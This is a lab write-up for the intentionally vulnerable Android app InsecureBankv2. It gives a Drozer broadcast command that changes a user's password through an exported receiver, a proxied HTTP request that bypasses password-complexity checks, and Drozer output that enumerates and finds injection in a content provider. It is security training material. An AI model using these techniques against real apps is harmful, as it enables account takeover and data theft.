# Insecure Bank v2

## Setup

```
git clone https://github.com/dineshshetty/Android-InsecureBankv2.git
cd AndroLabServer
pip install -r requirements.txt
python app.py
```

The server starts running on port 8888.

Install the app on your phone and connect to the same network as the server.

After opening the app on your phone, go to preferences and add your server's IP and port number.

Log in using the credentials given in the documentation.

-----

Checklist

- [x] Flawed Broadcast Receivers
- [ ] Intent Sniffing and Injection
- [ ] Weak Authorization mechanism
- [ ] Local Encryption issues
- [ ] Vulnerable Activity Components
- [ ] Root Detection and Bypass
- [ ] Emulator Detection and Bypass
- [ ] Insecure Content Provider access
- [ ] Insecure Webview implementation
- [ ] Weak Cryptography implementation
- [ ] Application Patching
- [ ] Sensitive Information in Memory
- [ ] Insecure Logging mechanism
- [ ] Android Pasteboard vulnerability
- [ ] Application Debuggable
- [ ] Android keyboard cache issues
- [ ] Android Backup vulnerability
- [ ] Runtime Manipulation
- [ ] Insecure SDCard storage
- [ ] Insecure HTTP connections
- [ ] Parameter Manipulation
- [ ] Hardcoded secrets
- [ ] Username Enumeration issue
- [ ] Developer Backdoors
- [x] Weak change password implementation

-----

## Flawed Broadcast Receivers

In AndroidManifest.xml, we have this code:

```
<receiver android:name="com.android.insecurebankv2.MyBroadCastReceiver" android:exported="true">
    <intent-filter>
        <action android:name="theBroadcast"/>
    </intent-filter>
</receiver>
```

You can learn more about it over [here](https://developer.android.com/guide/components/broadcasts) and [here](https://developer.android.com/guide/components/intents-filters).

Essentially, a broadcast receiver is a form of intent. Intents themselves are of two types: explicit and implicit. Explicit intents need the exact application name that is supposed to handle the action, whereas implicit intents can give you the option to choose between several apps that can handle the intent.

"By declaring an intent filter for an activity, you make it possible for other apps to directly start your activity with a certain kind of intent. Likewise, if you do not declare any intent filters for an activity, then it can be started only with an explicit intent."

We see that it uses the class MyBroadCastReceiver.java, so we'll go over the code in that file.

This class takes the phone number and new password from the previous activity.

```
String phn = intent.getStringExtra("phonenumber");
String newpass = intent.getStringExtra("newpass");
```

In order to understand why, where and how this broadcast is actually used, we search for "theBroadcast" and we find that it is used in ChangePassword.java as follows:

```
public void broadcastChangepasswordSMS(String phoneNumber, String pass) {

    if (TextUtils.isEmpty(phoneNumber.toString().trim())) {
        System.out.println("Phone number Invalid.");
        return;
    }

    Intent smsIntent = new Intent();
    smsIntent.setAction("theBroadcast");
    smsIntent.putExtra("phonenumber", phoneNumber);
    smsIntent.putExtra("newpass", pass);
    sendBroadcast(smsIntent);

}
```

So if we can create such an intent in another app, we can change the password of the user by calling the Context.sendBroadcast(Intent) as mentioned in the [BroadcastReceiver](https://developer.android.com/reference/android/content/Context#sendBroadcast(android.content.Intent)) documentation.

In order to save time, we can also use Drozer's `app.broadcast.send` to quickly send a broadcast without having to create an app.

```
dz> run app.broadcast.send --action theBroadcast MyBroadCastReceiver --extra string phonenumber 1234 --extra string newpass asdf
```

Take a look at [this](https://hackerone.com/redirect?signature=e9b262c23bb3df8ec37850c763775bafb8b7acca&url=https%3A%2F%2Foldbam.github.io%2Fandroid%2Fsecurity%2Fandroid-vulnerabilities-insecurebank-broadcast-receivers) link.

Similar example can be found in [this](https://hackerone.com/reports/289000) report.

-----

## Weak change password implementation

Client-side check requires password to be complex, but can be circumvented by intercepting and modifying request through a proxy.

```
POST /changepassword HTTP/1.1
Content-Length: 46
Content-Type: application/x-www-form-urlencoded
Host: 10.0.2.2:8888
Connection: close
User-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4)

username=dinesh&newpassword=dinesh
```

-----

### Drozer

```
# getting attack surface
dz> run app.package.attacksurface com.android.insecurebankv2
Attack Surface:
  5 activities exported
  1 broadcast receivers exported
  1 content providers exported
  0 services exported
    is debuggable

# content-providers
dz> run app.provider.info -a com.android.insecurebankv2
Package: com.android.insecurebankv2
  Authority: com.android.insecurebankv2.TrackUserContentProvider
    Read Permission: null
    Write Permission: null
    Content Provider: com.android.insecurebankv2.TrackUserContentProvider
    Multiprocess Allowed: False
    Grant Uri Permissions: False

# content-provider URIs
dz> run scanner.provider.finduris -a com.android.insecurebankv2
Scanning com.android.insecurebankv2...
Unable to Query  content://com.android.insecurebankv2.TrackUserContentProvider/
Unable to Query  content://com.google.android.gms.games
Unable to Query  content://com.android.insecurebankv2.TrackUserContentProvider
Able to Query    content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers
Able to Query    content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/
Unable to Query  content://com.google.android.gms.games/

Accessible content URIs:
  content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers
  content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/

# content-providers retrieve information

dz> run app.provider.query content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/
| id | name   |
| 1  | dinesh |
| 2  | dinesh |
| 3  | dinesh |

# content-provider injection
dz> run scanner.provider.injection -a com.android.insecurebankv2
Scanning com.android.insecurebankv2...
Not Vulnerable:
  content://com.android.insecurebankv2.TrackUserContentProvider/
  content://com.google.android.gms.games
  content://com.google.android.gms.games/
  content://com.android.insecurebankv2.TrackUserContentProvider

Injection in Projection:
  content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers
  content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/

Injection in Selection:
  content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers
  content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/
```

